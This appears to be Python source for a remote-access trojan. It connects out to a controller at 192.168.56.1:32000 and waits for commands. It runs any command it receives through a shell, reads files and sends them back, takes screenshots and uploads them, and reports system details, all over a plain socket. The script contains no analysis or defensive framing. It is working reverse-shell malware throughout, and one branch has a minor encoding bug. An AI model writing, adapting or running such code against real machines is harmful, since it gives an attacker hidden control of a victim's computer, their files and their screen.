import socket
import time
import subprocess
import platform
import os
from PIL import ImageGrab

SERVER_IP = "192.168.56.1"
SERVER_PORT = 32000
MAX_DATA_SIZE = 1024



print(f"The connection to the server with the address {SERVER_IP} and port {SERVER_PORT} is now being made...")
while True:
    try:
        c = socket.socket()
        c.connect((SERVER_IP, SERVER_PORT))
        time.sleep(4)
    except ConnectionRefusedError:
        print("Error: We could not connect you to the server \nA new attempt to connect")
    else:
        print("The connection to the server was made successfully")
        break

while True:
    command_data = c.recv(MAX_DATA_SIZE)
    if not command_data:
        break
    
    command = command_data.decode()
    command_split = command.split(" ")
    if command == "info":
        answer =  platform.platform() + os.getcwd()
        answer = answer.encode()
    elif len(command_split) == 2 and command_split[0] == "cd":
        try:
            os.chdir(command_split[1].strip("''"))
            answer = " "
        except FileNotFoundError:
            answer = "Error: No folder with this name found"
            answer = answer.encode()
    elif len(command_split) == 2 and command_split[0] == "dl":
        try:
            f = open(command_split[1], "rb")
        except FileNotFoundError:
            answer = " ".encode()
        else:
            answer = f.read()
            f.close()
    elif len(command_split) == 2 and command_split[0] == "cp":
        screenshot = ImageGrab.grab()
        screenshot_filename = command_split[1] + ".png"
        screenshot.save(screenshot_filename, "PNG")
        try:
            f = open(screenshot_filename, "rb")
        except FileNotFoundError:
            answer = " ".encode()
        else:
            answer = f.read()
            f.close()
    else:
        outcome = subprocess.run(command, shell=True, capture_output=True, universal_newlines=True)
        answer = outcome.stdout + outcome.stderr
        if not answer or len(answer) == 0:
            answer = " "
        answer = answer.encode()
    data_len = len(answer)
    header = str(data_len).zfill(13)
    print("HEADER:", header)
    c.sendall(header.encode())
    if data_len > 0:
        c.sendall(answer)



c.close()



